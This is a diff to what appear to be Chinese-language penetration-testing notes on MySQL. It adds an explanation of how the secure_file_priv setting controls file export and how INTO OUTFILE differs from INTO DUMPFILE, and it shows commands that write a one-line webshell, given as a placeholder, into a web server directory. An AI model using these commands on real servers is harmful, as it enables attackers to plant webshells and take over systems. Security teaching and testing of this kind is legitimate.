@@ -29,9 +29,18 @@ show global variables like '%long_query_time%';
 ## webshell写入
 
 > 需要：web服务器发布路径，secure_file_priv不等于null（my.ini my.cnf）
+>
+> - 其中当参数 `secure_file_priv` 为空时，对导入导出无限制
+> - 当值为一个指定的目录时，只能向指定的目录导入导出
+> - 当值被设置为NULL时，禁止导入导出功能
+---------
+> outfile函数可以导出多行，而dumpfile只能导出一行数据
+>
+> outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式
 
 ```sql
 SHOW VARIABLES LIKE "secure_file_priv";
+select @@secure_file_priv;
 select '一句话木马' into outfile "/www/asda";
 select '一句话木马' into dumpfile "/www/asda";
 ```
